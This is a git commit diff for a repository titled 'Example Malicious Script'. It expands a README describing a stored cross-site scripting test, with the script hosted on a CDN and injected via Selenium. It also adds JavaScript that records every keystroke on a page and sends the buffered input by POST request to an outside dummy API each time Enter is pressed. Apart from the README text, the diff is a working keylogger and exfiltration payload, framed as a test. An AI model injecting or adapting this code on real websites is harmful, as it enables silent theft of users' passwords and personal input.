bb9325e58c211fba3780fca683dc71a659e569f2
lfcourtney <lukechopper22@gmail.com>
2024-11-09 18:16:52 +0000

    Updated script to make POST request to https://jsonplaceholder.typicode.com/ to simulate the logging of user input

--- README.md
+++ README.md
@@ -1,5 +1,11 @@
 # Example Malicious Script
 
-This is an example JavaScript file that will be the site of a cross site scripting attack. Without the clients consent or knowledge, this file will be injected into the web page.
+This is an example JavaScript file that will be injected into a benign website, thus being the site of a Cross-Site Scripting (XSS).
 
-This is for testing purposes only.
+Specifically, this JavaScript file will be involved in a Stored XSS attack. The file is cached on jsDelivr's CDN servers and will be injected to the user through there.
+
+Selenium, a Python package that automates browser interactions, will be used to test this attack. Its WebDriver API will open the default browser on a specific website and load the script tag in the header of the DOM, loading the script from jsDelivr's servers.
+
+To test the attack is working, the script is designed to log the keyboard inputs of the user on the webpage to a file (inputs.txt)
+
+**This is for testing purposes only.**
--- cross_site_scripting.js
+++ cross_site_scripting.js
@@ -1,3 +1,48 @@
+// Send dummy post request to JSONPlaceholder API.
+// See https://jsonplaceholder.typicode.com/ for more information.
+function sendLoggedInput(loggedInput) {
+  // Dummy data to send to the dummy api
+  const dummyData = {
+    title: 'Input to log',
+    body: loggedInput,
+    userId: 1,
+  };
+
+  const jsonData = JSON.stringify(dummyData);
+
+  const xhr = new XMLHttpRequest();
+  xhr.open('POST', 'https://jsonplaceholder.typicode.com/posts', true);
+
+  // Send JSON data
+  xhr.setRequestHeader('Content-Type', 'application/json; charset=UTF-8');
+
+  xhr.onreadystatechange = function () {
+    // Request finished
+    if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+      const response = JSON.parse(xhr.responseText);
+      console.log('Response:', response);
+    }
+  };
+
+  xhr.onerror = function (eventError) {
+    console.error(eventError);
+  };
+
+  xhr.send(jsonData);
+}
+
 if (document.readyState === 'complete') {
   console.log('This is a script that should not be run.');
+
+  let logInputs = '';
+
+  document.addEventListener('keydown', function (event) {
+    if (event.key === 'Enter') {
+      sendLoggedInput(logInputs);
+      logInputs = '';
+      return;
+    }
+
+    logInputs += event.key;
+  });
 }
